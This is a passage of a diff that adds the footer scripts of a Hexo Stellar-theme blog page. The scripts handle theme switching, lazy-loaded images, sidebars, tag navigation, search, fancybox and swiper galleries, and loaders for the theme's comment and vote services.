+              onFailure?.();
+              reject(err);
+            } else {
+              setTimeout(load, 1000);
+            }
+          });
+        };
+
+        load();
+      });
+    },
+    requestWithoutLoading: (url, options = {}, maxRetry = 2, timeout = 5000) => {
+      return new Promise((resolve, reject) => {
+        let retryCount = 0;
+
+        const tryRequest = () => {
+          let timedOut = false;
+          const timer = setTimeout(() => {
+            timedOut = true;
+            if (++retryCount > maxRetry) reject('timeout');
+            else tryRequest();
+          }, timeout);
+
+          fetch(url, options)
+            .then(resp => {
+              clearTimeout(timer);
+              if (!resp.ok) throw new Error('bad response');
+              resolve(resp);
+            })
+            .catch(err => {
+              clearTimeout(timer);
+              if (++retryCount > maxRetry) reject(err);
+              else setTimeout(tryRequest, 500);
+            });
+        };
+
+        tryRequest();
+      });
+    },
+    /********************** requestAnimationFrame ********************************/
+    // 1、requestAnimationFrame 会把每一帧中的所有 DOM 操作集中起来，在一次重绘或回流中就完成，并且重绘或回流的时间间隔紧紧跟随浏览器的刷新频率，一般来说，这个频率为每秒60帧。
+    // 2、在隐藏或不可见的元素中，requestAnimationFrame 将不会进行重绘或回流，这当然就意味着更少的的 cpu，gpu 和内存使用量。
+    requestAnimationFrame: (fn) => {
+      if (!window.requestAnimationFrame) {
+        window.requestAnimationFrame = window.requestAnimationFrame || window.mozRequestAnimationFrame || window.webkitRequestAnimationFrame;
+      }
+      window.requestAnimationFrame(fn)
+    },
+    dark: {},
+  };
+
+  // utils.dark.mode 当前模式 dark or light
+  // utils.dark.toggle() 暗黑模式触发器
+  // utils.dark.push(callBack[,"callBackName"]) 传入触发器回调函数
+  utils.dark.method = {
+    toggle: new RunItem(),
+  };
+  utils.dark = Object.assign(utils.dark, {
+    push: utils.dark.method.toggle.push,
+  });
+</script>
+<script>
+  const sidebar = {
+    leftbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    rightbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('rightbar');
+        l_body.removeAttribute('leftbar');
+      }
+    },
+    dismiss: () => {
+      if (l_body) {
+        l_body.removeAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    toggleTOC: () => {
+      document.querySelector('#data-toc').classList.toggle('collapse');
+    }
+  }
+</script>
+<script type="text/javascript">
+  (() => {
+    const tagSwitchers = document.querySelectorAll('.tag-subtree.parent-tag > a > .tag-switcher-wrapper')
+    for (const tagSwitcher of tagSwitchers) {
+      tagSwitcher.addEventListener('click', (e) => {
+        const parent = e.target.closest('.tag-subtree.parent-tag')
+        parent.classList.toggle('expanded')
+        e.preventDefault()
+      })
+    }
+
+    // Get active tag from query string, then activate it.
+    const urlParams = new URLSearchParams(window.location.search)
+    const activeTag = urlParams.get('tag')
+    if (activeTag) {
+      let tag = document.querySelector(`.tag-subtree[data-tag="${activeTag}"]`)
+      if (tag) {
+        tag.querySelector('a').classList.add('active')
+        
+        while (tag) {
+          tag.classList.add('expanded')
+          tag = tag.parentElement.closest('.tag-subtree.parent-tag')
+        }
+      }
+    }
+  })()
+</script>
+
+<script async src="https://gcore.jsdelivr.net/npm/vanilla-lazyload@19.1/dist/lazyload.min.js"></script>
+<script>
+  // https://www.npmjs.com/package/vanilla-lazyload
+  // Set the options globally
+  // to make LazyLoad self-initialize
+  window.lazyLoadOptions = {
+    elements_selector: ".lazy",
+    callback_loaded: (el) => {
+      el.classList.add('loaded');
+      const wrapper = el.closest('.lazy-box');
+      const icon = wrapper?.querySelector('.lazy-icon');
+      if (icon) icon.remove();
+    }
+  };
+  // Listen to the initialization event
+  // and get the instance of LazyLoad
+  window.addEventListener(
+    "LazyLoad::Initialized",
+    function (event) {
+      window.lazyLoadInstance = event.detail.instance;
+    },
+    false
+  );
+  document.addEventListener('DOMContentLoaded', function () {
+    window.lazyLoadInstance?.update();
+  });
+
+  window.wrapLazyloadImages = (container) => {
+    if (typeof container === 'string') {
+      container = document.querySelector(container);
+    }
+    if (!container) return;
+    
+    const images = container.querySelectorAll('img');
+    images.forEach((img) => {
+      if (img.classList.contains('lazy')) return;
+
+      const src = img.getAttribute('src');
+      if (!src) return;
+
+      const wrapper = document.createElement('div');
+      wrapper.className = 'lazy-box';
+
+      const newImg = img.cloneNode();
+      newImg.removeAttribute('src');
+      newImg.setAttribute('data-src', src);
+      newImg.classList.add('lazy');
+
+      const icon = document.createElement('div');
+      icon.className = 'lazy-icon';
+      if (def.loading) {
+        icon.style.backgroundImage = `url("${def.loading}")`;
+      }
+
+      wrapper.appendChild(newImg);
+      wrapper.appendChild(icon);
+
+      img.replaceWith(wrapper);
+    });
+
+    // 通知 LazyLoad 更新
+    if (window.lazyLoadInstance?.update) {
+      window.lazyLoadInstance.update();
+    }
+  }
+  
+</script>
+
+<!-- required -->
+<script src="/js/main.js?v=1.33.1" defer></script>
+
+<script type="text/javascript">
+  const applyTheme = (theme) => {
+    if (theme === 'auto') {
+      document.documentElement.removeAttribute('data-theme')
+    } else {
+      document.documentElement.setAttribute('data-theme', theme)
+    }
+
+    // applyThemeToGiscus(theme)
+  }
+
+  // FIXME: 这会导致无法使用 preferred_color_scheme 以外的主题
+  const applyThemeToGiscus = (theme) => {
+    // theme = theme === 'auto' ? 'preferred_color_scheme' : theme
+    const cmt = document.getElementById('giscus')
+    if (cmt) {
+      // This works before giscus load.
+      cmt.setAttribute('data-theme', theme)
+    }
+
+    const iframe = document.querySelector('#comments > section.giscus > iframe')
+    if (iframe) {
+      // This works after giscus loaded.
+      const src = iframe.src
+      const newSrc = src.replace(/theme=[\w]+/, `theme=${theme}`)
+      iframe.src = newSrc
+    }
+  }
+
+  const switchTheme = () => {
+    // light -> dark -> auto -> light -> ...
+    const currentTheme = document.documentElement.getAttribute('data-theme')
+    let newTheme;
+    switch (currentTheme) {
+      case 'light':
+        newTheme = 'dark'
+        break
+      case 'dark':
+        newTheme = 'auto'
+        break
+      default:
+        newTheme = 'light'
+    }
+    applyTheme(newTheme)
+    window.localStorage.setItem('Stellar.theme', newTheme)
+    utils.dark.mode = newTheme === 'auto' ? (window.matchMedia("(prefers-color-scheme: dark)").matches ? "dark" : "light") : newTheme;
+    utils.dark.method.toggle.start();
+
+    const messages = {
+      light: `切换到浅色模式`,
+      dark: `切换到深色模式`,
+      auto: `切换到跟随系统配色`,
+    }
+    hud?.toast?.(messages[newTheme])
+  }
+
+  (() => {
+    // Apply user's preferred theme, if any.
+    const theme = window.localStorage.getItem('Stellar.theme')
+    if (theme !== null) {
+      applyTheme(theme)
+    } else {
+      utils.dark.mode = window.matchMedia("(prefers-color-scheme: dark)").matches ? "dark" : "light";
+    }
+    utils.dark.method.toggle.start();
+  })()
+</script>
+
+
+<!-- optional -->
+
+
+
+<script defer>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.services = Object.assign({}, JSON.parse(`{"mdrender":{"js":"/js/services/mdrender.js"},"siteinfo":{"js":"/js/services/siteinfo.js","api":null},"ghinfo":{"js":"/js/services/ghinfo.js"},"rating":{"js":"/js/services/rating.js","api":"https://star-vote.xaox.cc/api/rating"},"vote":{"js":"/js/services/vote.js","api":"https://star-vote.xaox.cc/api/vote"},"sites":{"js":"/js/services/sites.js"},"friends":{"js":"/js/services/friends.js"},"friends_and_posts":{"js":"/js/services/friends_and_posts.js"},"timeline":{"js":"/js/services/timeline.js"},"fcircle":{"js":"/js/services/fcircle.js"},"weibo":{"js":"/js/services/weibo.js"},"memos":{"js":"/js/services/memos.js"},"voice":{"js":"/js/plugins/voice.js"},"video":{"js":"/js/plugins/video.js"},"download-file":{"js":"/js/plugins/download-file.js"},"twikoo":{"js":"/js/services/twikoo_latest_comment.js"},"waline":{"js":"/js/services/waline_latest_comment.js"},"artalk":{"js":"/js/services/artalk_latest_comment.js"},"giscus":{"js":"/js/services/giscus_latest_comment.js"},"contributors":{"edit_this_page":{"_posts/":null,"wiki/stellar/":"https://github.com/xaoxuu/hexo-theme-stellar-docs/blob/main/"},"js":"/js/services/contributors.js"}}`));
+    for (let id of Object.keys(ctx.services)) {
+      const js = ctx.services[id].js;
+      if (id == 'siteinfo') {
+        ctx.cardlinks = document.querySelectorAll('a.link-card[cardlink]');
+        if (ctx.cardlinks?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            setCardLink(ctx.cardlinks);
+          });
+        }
+      } else if (id == 'voice') {
+        ctx.voiceAudios = document.querySelectorAll('.voice>audio');
+        if (ctx.voiceAudios?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            createVoiceDom(ctx.voiceAudios);
+          });
+        }
+      } else if (id == 'video') {
+        ctx.videos = document.querySelectorAll('.video>video');
+        if (ctx.videos?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            videoEvents(ctx.videos);
+          });
+        }
+      } else if (id == 'download-file') {
+        ctx.files = document.querySelectorAll('.file');
+        if (ctx.files?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            downloadFileEvent(ctx.files);
+          });
+        }
+      } else {
+        const els = document.getElementsByClassName(`ds-${id}`);
+        if (els?.length > 0) {
+          utils.jq(() => {
+            if (id == 'timeline' || 'memos' || 'marked') {
+              utils.js(deps.marked).then(function () {
+                utils.js(js, { defer: true });
+              });
+            } else {
+              utils.js(js, { defer: true });
+            }
+          });
+        }
+      }
+    }
+
+    // chat iphone time
+    let phoneTimes = document.querySelectorAll('.chat .status-bar .time');
+
+    if (phoneTimes.length > 0) {
+      NowTime();
+      var date = new Date();
+      var sec = date.getSeconds();
+      var firstAdjustInterval = setInterval(firstAdjustTime, 1000 * (60 - sec));
+    }
+
+    function firstAdjustTime() {
+      NowTime();
+      clearInterval(firstAdjustInterval);
+      setInterval(NowTime, 1000 * 60);
+    }
+
+    function NowTime() {
+      for (let i = 0; i < phoneTimes.length; ++i) {
+        var timeSpan = phoneTimes[i];
+        var date = new Date();
+        var hour = date.getHours();
+        var min = date.getMinutes();
+        timeSpan.innerHTML = check(hour) + ":" + check(min);
+      }
+    };
+
+    function check(val) {
+      if (val < 10) {
+        return ("0" + val);
+      }
+      return (val);
+    }
+
+    // chat quote
+    const chat_quote_obverser = new IntersectionObserver((entries, observer) => {
+      entries.filter((entry) => { return entry.isIntersecting }).sort((a, b) => a.intersectionRect.y !== b.intersectionRect.y ? a.intersectionRect.y - b.intersectionRect.y : a.intersectionRect.x - b.intersectionRect.x).forEach((entry, index) => {
+          observer.unobserve(entry.target);
+          setTimeout(() => {
+            entry.target.classList.add('quote-blink');
+            setTimeout(() => {
+              entry.target.classList.remove('quote-blink');
+            }, 1000);
+          }, Math.max(100, 16) * (index + 1));
+        });
+    });
+
+    var chatQuotes = document.querySelectorAll(".chat .talk .quote");
+    chatQuotes.forEach((quote) => {
+      quote.addEventListener('click', function () {
+        var chatCellDom = document.getElementById("quote-" + quote.getAttribute("quotedCellTag"));
+        if (chatCellDom) {
+          var chatDiv = chatCellDom.parentElement;
+          var mid = chatDiv.clientHeight / 2;
+          var offsetTop = chatCellDom.offsetTop;
+          if (offsetTop > mid - chatCellDom.clientHeight / 2) {
+            chatDiv.scrollTo({
+              top: chatCellDom.offsetTop - mid + chatCellDom.clientHeight / 2,
+              behavior: "smooth"
+            });
+          } else {
+            chatDiv.scrollTo({
+              top: 0,
+              behavior: "smooth"
+            });
+          }
+          chat_quote_obverser.observe(chatCellDom);
+        }
+      });
+    });
+  });
+</script>
+
+<script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.search = {
+      path: `/search.json`,
+    }
+    utils.js('/js/search/local-search.js', { defer: true });
+  });
+</script><script>
+  window.FPConfig = {
+    delay: 0,
+    ignoreKeywords: [],
+    maxRPS: 5,
+    hoverDelay: 25
+  };
+</script>
+<script defer src="https://gcore.jsdelivr.net/npm/flying-pages@2/flying-pages.min.js"></script><script>
+  ctx.fancybox = {
+    selector: `.timenode p>img`,
+    css: `https://gcore.jsdelivr.net/npm/@fancyapps/ui@5.0/dist/fancybox/fancybox.css`,
+    js: `https://gcore.jsdelivr.net/npm/@fancyapps/ui@5.0/dist/fancybox/fancybox.umd.js`
+  };
+  var selector = '[data-fancybox]:not(.error), .with-fancybox .atk-content img:not([atk-emoticon])';
+  if (ctx.fancybox.selector) {
+    selector += `, ${ctx.fancybox.selector}`
+  }
+  var needFancybox = document.querySelectorAll(selector).length !== 0;
+  if (!needFancybox) {
+    const memos = document.getElementsByClassName('ds-memos');
+    if (memos != undefined && memos.length > 0) {
+      needFancybox = true;
+    }
+    const fancybox = document.getElementsByClassName('with-fancybox');
+    if (fancybox != undefined && fancybox.length > 0) {
+      needFancybox = true;
+    }
+  }
+  if (needFancybox) {
+    utils.css(ctx.fancybox.css);
+    utils.js(ctx.fancybox.js, { defer: true }).then(function () {
+      Fancybox.bind(selector, {
+        hideScrollbar: false,
+        Thumbs: {
+          autoStart: false,
+        },
+        caption: (fancybox, slide) => {
+          return slide.triggerEl.alt || slide.triggerEl.dataset.caption || null
+        }
+      });
+    })
+  }
+</script>
+<script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    const swiper_api = document.getElementById('swiper-api');
+    if (swiper_api != undefined) {
+      utils.css(`https://unpkg.com/swiper@10.3/swiper-bundle.min.css`);
+      utils.js(`https://unpkg.com/swiper@10.3/swiper-bundle.min.js`, { defer: true }).then(function () {
+        const effect = swiper_api.getAttribute('effect') || '';
+        var swiper = new Swiper('.swiper#swiper-api', {
+          slidesPerView: 'auto',
+          spaceBetween: 8,
+          centeredSlides: true,
+          effect: effect,
+          rewind: true,
+          pagination: {
+            el: '.swiper-pagination',
+            clickable: true,
+          },
+          navigation: {
+            nextEl: '.swiper-button-next',
+            prevEl: '.swiper-button-prev',
+          },
+        });
+      })
+    }
+  });
+</script>
+<script>
+  document.addEventListener('DOMContentLoaded', function () {
+    window.codeElements = document.querySelectorAll('.code');
+    if (window.codeElements.length > 0) {
+      ctx.copycode = {
+        default_text: `Copy`,
+        success_text: `Copied`,
+        toast: `复制成功`,
+      };
+      utils.js('/js/plugins/copycode.js');
+    }
+  });
+</script>
+
+
+<!-- inject -->
+
+</div></body></html>
